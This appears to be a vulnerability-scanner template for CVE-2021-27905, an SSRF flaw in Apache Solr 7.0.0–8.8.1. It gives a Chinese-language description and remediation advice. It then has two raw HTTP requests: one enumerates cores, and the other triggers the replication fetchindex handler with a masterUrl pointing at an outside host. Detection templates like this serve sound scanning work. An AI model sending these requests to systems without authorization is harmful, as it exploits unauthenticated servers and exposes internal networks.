id: CVE-2021-27905
info:
  name: Apache Solr <=8.8.1 - Server-Side Request Forgery
  author:
  - l0ne1y
  description: |-
    Apache Solr leaderUrl SSRF漏洞
    Apache Solr 的某些功能存在参数过滤不严格，在 Apache Solr 未开启认证的情况下，攻击者可直接构造特定请求造成 SSRF 漏洞。

    受影响版本：
    Apache Solr 7.0.0 - 7.7.3
    Apache Solr 8.0.0 - 8.8.1
  severity: high
  remediation: |-
    **官方修复方案**
    增加身份验证/授权，可参考官方文档：https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html。

    **临时修复方案**
    1、禁止Solr API 以及管理 UI 直接对公网开放。设置防火墙，以便只允许受信任的计算机和人员访问。
requests:
- matchers:
  - type: word
    part: body
    words:
    - <str name="status">OK</str>
  extractors:
  - name: core
    type: regex
    regex:
    - '"name"\:"(.*?)"'
    group: 1
    internal: true
  raw:
  - |
    GET /solr/admin/cores?wt=json HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: en
    Connection: close
  - |
    GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://example.com HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: en
    Connection: close
